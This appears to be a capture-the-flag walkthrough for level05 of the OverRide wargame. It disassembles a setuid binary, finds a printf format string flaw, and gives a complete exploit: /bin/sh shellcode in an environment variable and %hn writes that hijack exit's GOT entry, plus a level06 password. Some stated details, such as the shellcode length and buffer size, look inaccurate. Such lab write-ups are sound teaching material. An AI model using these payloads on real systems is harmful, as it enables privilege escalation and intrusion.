# Level05 Walkthrough
## Initial Analysis
### 1. Examine the Binary
```bash
level05@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level05 level05   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level05 level05  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level05 level05 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level06 users   6500 Sep 10  2016 level05
-rw-r--r--+ 1 level05 level05   41 Oct 19  2016 .pass
-rw-r--r--  1 level05 level05  675 Sep 10  2016 .profile
```
**Key observations:**

setuid and setgid binary (s flags in permissions)

Owned by level06 user

When executed, runs with level06 privileges

## 2. Test Basic Execution
```bash
level05@OverRide:~$ ./level05
test
test
```
**Observations:**

Program reads input via fgets()

Echoes back the input in lowercase

No obvious error messages

## Reverse Engineering
### 3. Function Analysis
```bash
(gdb) info functions
All defined functions:
0x08048340  printf@plt
0x08048350  fgets@plt
0x08048370  exit@plt
0x08048444  main
Only main() function.
```
### 4. Disassembling main
```bash
(gdb) disas main
assembly
0x08048444 <+0>:     push   %ebp
0x08048445 <+1>:     mov    %esp,%ebp
0x08048447 <+3>:     push   %edi
0x08048448 <+4>:     push   %ebx
0x08048449 <+5>:     and    $0xfffffff0,%esp
0x0804844c <+8>:     sub    $0x90,%esp

# Read input with fgets (100 bytes max)
0x0804845d <+25>:    mov    0x80497f0,%eax      # stdin
0x08048462 <+30>:    mov    %eax,0x8(%esp)
0x08048466 <+34>:    movl   $0x64,0x4(%esp)     # 100 bytes
0x0804846e <+42>:    lea    0x28(%esp),%eax     # buffer at esp+0x28 (40 bytes)
0x08048472 <+46>:    mov    %eax,(%esp)
0x08048475 <+49>:    call   0x8048350 <fgets@plt>

# Loop to convert uppercase to lowercase
0x0804847a <+54>:    movl   $0x0,0x8c(%esp)     # i = 0
0x08048485 <+65>:    jmp    0x80484d3 <main+143>

0x08048487 <+67>:    lea    0x28(%esp),%eax
0x0804848b <+71>:    add    0x8c(%esp),%eax
0x08048492 <+78>:    movzbl (%eax),%eax
0x08048495 <+81>:    cmp    $0x40,%al           # if char > '@' (64)
0x08048497 <+83>:    jle    0x80484cb <main+135>
0x08048499 <+85>:    lea    0x28(%esp),%eax
0x0804849d <+89>:    add    0x8c(%esp),%eax
0x080484a4 <+96>:    movzbl (%eax),%eax
0x080484a7 <+99>:    cmp    $0x5a,%al           # if char <= 'Z' (90)
0x080484a9 <+101>:   jg     0x80484cb <main+135>

# Convert uppercase to lowercase (XOR with 0x20)
0x080484ab <+103>:   lea    0x28(%esp),%eax
0x080484af <+107>:   add    0x8c(%esp),%eax
0x080484b6 <+114>:   movzbl (%eax),%eax
0x080484b9 <+117>:   mov    %eax,%edx
0x080484bb <+119>:   xor    $0x20,%edx
0x080484be <+122>:   lea    0x28(%esp),%eax
0x080484c2 <+126>:   add    0x8c(%esp),%eax
0x080484c9 <+133>:   mov    %dl,(%eax)

0x080484cb <+135>:   addl   $0x1,0x8c(%esp)     # i++

# Loop condition (i < strlen)
0x080484d3 <+143>:   mov    0x8c(%esp),%ebx
0x080484da <+150>:   lea    0x28(%esp),%eax
0x080484de <+154>:   movl   $0xffffffff,0x1c(%esp)
0x080484e6 <+162>:   mov    %eax,%edx
0x080484e8 <+164>:   mov    $0x0,%eax
0x080484ed <+169>:   mov    0x1c(%esp),%ecx
0x080484f1 <+173>:   repnz scas %es:(%edi),%al
0x080484f3 <+175>:   mov    %ecx,%eax
0x080484f5 <+177>:   not    %eax
0x080484f7 <+179>:   sub    $0x1,%eax
0x080484fc <+184>:   cmp    %eax,%ebx
0x080484fe <+186>:   jb     0x8048487 <main+67>

# Print the converted string - FORMAT STRING VULNERABILITY! ⚡
0x08048500 <+188>:   lea    0x28(%esp),%eax
0x08048504 <+192>:   mov    %eax,(%esp)
0x08048507 <+195>:   call   0x8048340 <printf@plt>

0x0804850c <+200>:   movl   $0x0,(%esp)
0x08048513 <+207>:   call   0x8048370 <exit@plt>
```
### 5. Identifying the Vulnerability
The program has two issues:

Buffer overflow: 100-byte read into 40-byte buffer

Format string vulnerability: printf(buffer) with user-controlled input

The format string is the primary attack vector.

## Format String Exploitation
### 6. Finding Stack Position
```bash
level05@OverRide:~$ python -c 'print "BBBB"+"-%x"*12' | ./level05
bbbb-64-f7fcfac0-f7ec3af9-ffffd5ff-ffffd5fe-0-ffffffff-ffffd684-f7fdb000-62626262-2d78252d-252d7825
```
Our input "BBBB" (0x62626262) appears at position 10! So we can use %10$hn and %11$hn to write to addresses.

### 7. Shellcode Selection
We'll use a 28-byte shellcode that spawns /bin/sh:

```assembly
\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh
```
### 8. Storing Shellcode in Environment Variable
Environment variables have no size limit and are stored on the stack:

```bash
env -i PAYLOAD=$(python -c 'print "\x90"*1000 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level05
```
### 9. Finding Shellcode Address
In GDB, examine the environment variables:

```bash
(gdb) x/200s environ
...
0xffffdc59:  "\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"
...
```
The shellcode is at 0xffffdc59 (within the NOP sled).
### 10. GOT Hijacking Target
The program ends with exit(). We can hijack the GOT entry for exit():

```bash
(gdb) x/i 0x08048370
0x8048370 <exit@plt>:   jmp    *0x80497e0
Target GOT address: 0x80497e0
```
### 11. Splitting the Address for %hn
We need to write 0xffffdc59 to 0x80497e0:

Low bytes: 0xdc59 = 56409 decimal

High bytes: 0xffff = 65535 decimal

Since we print 8 bytes first (two addresses), we need to subtract 8:

First write: 56409 - 8 = 56401

Second write: 65535 - 56409 = 9126

### 12. The Payload Structure
```text
[exit@got low] + [exit@got high] + %56401d + %10$hn + %9126d + %11$hn
\xe0\x97\x04\x08: Address for low bytes (position 10)

\xe2\x97\x04\x08: Address for high bytes (position 11)

%56401d: Print 56401 spaces → total = 56409 (0xdc59)

%10$hn: Write to address at position 10

%9126d: Print 9126 more spaces → total = 65535 (0xffff)

%11$hn: Write to address at position 11
```
### 13. The Exploit
```bash
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"'; cat) | env -i PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') ./level05
```
## Exploit Visualization
### Memory Layout Before Exploit:
```text
Environment variables:
0xffffdc59: [NOP x1000][shellcode...]

GOT table:
0x80497e0: [exit@libc address]

Stack during printf:
Position 10: 0x80497e0 (exit GOT low)
Position 11: 0x80497e2 (exit GOT high)
Memory Layout After Exploit:
```
```text
GOT table after format string writes:
0x80497e0: 0xffffdc59 (points to NOP sled in environment)

When exit() is called:
exit@plt → jmp *0x80497e0 → 0xffffdc59 → NOP sled → shellcode → shell!
Getting the Flag
```
```bash
$ whoami
level06
$ cat /home/users/level06/.pass
h4GtNnaMs2kYF2pyLruwW4H9Yk6uJk6uYk6uJk6u
$ exit
```
Switch to level06
```bash
level05@OverRide:~$ su level06
Password: h4GtNnaMs2kYF2pyLruwW4H9Yk6uJk6uYk6uJk6u
level06@OverRide:~$
```
## Vulnerability Summary
**Root Cause:**
Format string vulnerability: printf(buffer) instead of printf("%s", buffer)

No bounds checking: User input passed directly to printf

## Exploitation Technique:
Stack position discovery: Found input at position 10

Environment variable payload: Stored 1000-byte NOP sled + shellcode

Address discovery: Found shellcode at 0xffffdc59

GOT hijacking: Targeted exit@got at 0x80497e0

Two-stage write: Used %hn to write 2 bytes at a time

Character counting: Calculated exact padding for each write

## Key Learning Points:
Environment variables are perfect for storing large payloads

NOP sleds provide reliability for address jumps

%hn allows writing 16-bit values (faster than %n)

GOT hijacking redirects program execution

Format string vulnerabilities enable arbitrary memory writes

**Final Commands**
```bash
# Set up environment with shellcode
export PAYLOAD=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')

# Run exploit with format string
(python -c 'print "\xe0\x97\x04\x08"+"\xe2\x97\x04\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"'; cat) | env -i PAYLOAD="$PAYLOAD" ./level05
```
Password for level06: h4GtNnaMs2kYF2pyLruwW4H9Yk6uJk6uYk6uJk6u